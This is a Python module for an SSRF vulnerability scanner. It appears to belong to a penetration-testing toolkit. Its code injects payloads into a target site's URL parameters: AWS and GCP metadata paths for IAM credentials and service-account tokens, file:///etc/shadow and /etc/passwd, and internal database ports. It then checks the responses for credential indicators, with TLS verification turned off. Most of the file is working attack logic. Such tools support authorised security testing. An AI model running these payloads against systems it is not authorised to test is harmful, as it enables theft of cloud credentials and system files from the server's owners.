"""Server-Side Request Forgery (SSRF) Scanner Module
Detects SSRF vulnerabilities through multiple attack vectors and cloud metadata exploitation
"""

import requests
from colorama import Fore, Style, init
import logging
import json
import time
from typing import Dict, List, Tuple
from urllib.parse import urlparse, urljoin
import socket
import threading

init(autoreset=True)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class SSRFScanner:
    """Advanced SSRF vulnerability detection with cloud metadata exploitation"""
    
    def __init__(self, target: str, verbose: bool = False):
        self.target = target if target.startswith(('http://', 'https://')) else f"https://{target}"
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (SSRF Scanner)'})
        self.vulnerabilities = []
        
        # SSRF Payloads targeting different systems
        self.ssrf_payloads = {
            'localhost': [
                'http://127.0.0.1:80',
                'http://localhost:80',
                'http://[::1]:80',
                'http://0.0.0.0:80',
            ],
            'internal_networks': [
                'http://192.168.1.1:80',
                'http://192.168.1.254:80',
                'http://10.0.0.1:80',
                'http://172.16.0.1:80',
            ],
            'aws_metadata': [
                'http://169.254.169.254/latest/meta-data/',
                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'http://169.254.169.254/latest/user-data',
                'http://169.254.169.254/latest/dynamic/instance-identity/document',
            ],
            'gcp_metadata': [
                'http://metadata.google.internal/computeMetadata/v1/',
                'http://metadata.google.com/computeMetadata/v1/',
                'http://169.254.169.254/computeMetadata/v1/',
                'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
            ],
            'azure_metadata': [
                'http://169.254.169.254/metadata/v1/maintenance',
                'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            ],
            'file_access': [
                'file:///etc/passwd',
                'file:///etc/shadow',
                'file:///windows/win.ini',
                'file:///../../../etc/passwd',
            ],
            'internal_services': [
                'http://localhost:3306',  # MySQL
                'http://localhost:5432',  # PostgreSQL
                'http://localhost:6379',  # Redis
                'http://localhost:27017', # MongoDB
                'http://localhost:8080',  # Common app ports
            ]
        }
        
        self.results = {
            'target': self.target,
            'timestamp': time.time(),
            'vulnerabilities': [],
            'metadata_extracted': [],
            'internal_services_found': [],
            'severity_breakdown': {'critical': 0, 'high': 0, 'medium': 0}
        }
    
    def extract_parameters(self) -> List[str]:
        """Extract URL and form parameters that might be vulnerable to SSRF"""
        params = ['url', 'uri', 'link', 'redirect', 'image', 'file', 'fetch', 'request', 
                  'path', 'src', 'endpoint', 'target', 'resource', 'proxy', 'callback']
        
        # Parse query parameters from URL
        parsed = urlparse(self.target)
        if parsed.query:
            for param in parsed.query.split('&'):
                if '=' in param:
                    params.append(param.split('=')[0])
        
        return list(set(params))
    
    def test_ssrf_payload(self, param: str, payload: str) -> Tuple[bool, str, str]:
        """Test SSRF payload against target"""
        try:
            # Test with different methods
            test_urls = [
                f"{self.target.rstrip('/')}?{param}={payload}",
                f"{self.target.rstrip('/')}&{param}={payload}",
                f"{self.target.rstrip('/')}#{param}={payload}",
            ]
            
            for test_url in test_urls:
                try:
                    response = self.session.get(test_url, timeout=10, verify=False, 
                                              allow_redirects=True)
                    
                    # Check for indicators of successful SSRF
                    indicators = [
                        'root:',
                        'daemon:',
                        'AWSTemplateDescription',
                        'computeMetadata',
                        'instance-identity',
                        'iam/security-credentials',
                        'System32',
                        '[mysqld]',
                        'Connected to',
                        '<!DOCTYPE',
                    ]
                    
                    for indicator in indicators:
                        if indicator in response.text:
                            return True, response.text[:500], indicator
                    
                    # Check for HTTP 200 on internal resources
                    if response.status_code == 200 and ('localhost' in payload or '127.0.0.1' in payload):
                        return True, response.text[:500], 'HTTP 200 on internal service'
                
                except Exception as e:
                    logger.debug(f"Payload test failed: {e}")
            
            return False, "", ""
        except Exception as e:
            logger.debug(f"SSRF test error: {e}")
            return False, "", ""
    
    def extract_cloud_metadata(self, response: str) -> List[str]:
        """Extract valuable information from cloud metadata responses"""
        extracted = []
        
        # Look for AWS credentials
        if 'AKIA' in response or 'aws' in response.lower():
            extracted.append("Possible AWS credentials found")
        
        # Look for GCP service account info
        if 'project_id' in response or 'private_key' in response:
            extracted.append("Possible GCP service account info found")
        
        # Look for tokens
        if 'token' in response.lower() or 'authorization' in response.lower():
            extracted.append("Possible authentication tokens found")
        
        return extracted
    
    def scan_internal_ports(self, host: str) -> List[int]:
        """Scan commonly used internal ports"""
        open_ports = []
        common_ports = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 27017]
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((host, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        
        return open_ports
    
    def generate_report(self) -> Dict:
        """Generate comprehensive SSRF scan report"""
        print(f"\n{Fore.CYAN}[*] SSRF Vulnerability Scanner{Style.RESET_ALL}")
        print("=" * 60)
        
        params = self.extract_parameters()
        print(f"{Fore.BLUE}[*] Testing {len(params)} parameters with {len(self.ssrf_payloads)} payload categories{Style.RESET_ALL}")
        
        # Test each parameter with each payload
        for param in params:
            for category, payloads in self.ssrf_payloads.items():
                for payload in payloads:
                    is_vuln, response, indicator = self.test_ssrf_payload(param, payload)
                    
                    if is_vuln:
                        vuln = {
                            'parameter': param,
                            'payload': payload[:50],
                            'category': category,
                            'indicator': indicator,
                            'response': response[:200],
                            'severity': 'Critical' if category in ['aws_metadata', 'gcp_metadata'] else 'High'
                        }
                        self.vulnerabilities.append(vuln)
                        
                        # Extract metadata if found
                        if category.endswith('_metadata'):
                            metadata = self.extract_cloud_metadata(response)
                            self.results['metadata_extracted'].extend(metadata)
                        
                        logger.warning(f"SSRF found: {param} -> {category}")
        
        # Build results
        self.results['vulnerabilities'] = self.vulnerabilities
        self.results['total_found'] = len(self.vulnerabilities)
        
        # Display results
        if self.vulnerabilities:
            print(f"\n{Fore.RED}[!] SSRF Vulnerabilities Found: {len(self.vulnerabilities)}{Style.RESET_ALL}")
            for vuln in self.vulnerabilities[:5]:
                print(f"  Parameter: {vuln['parameter']}")
                print(f"  Category: {vuln['category']}")
                print(f"  Indicator: {vuln['indicator']}")
        else:
            print(f"{Fore.GREEN}[+] No SSRF vulnerabilities detected{Style.RESET_ALL}")
        
        return self.results


def ssrf_scan(target: str, verbose: bool = False) -> Dict:
    """Main SSRF scanning function"""
    try:
        scanner = SSRFScanner(target, verbose)
        results = scanner.generate_report()
        
        # Save results
        filename = f"ssrf_scan_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"\n{Fore.GREEN}[+] Report saved to {filename}{Style.RESET_ALL}")
        return results
    except Exception as e:
        logger.error(f"SSRF scan failed: {e}")
        return {'error': str(e)}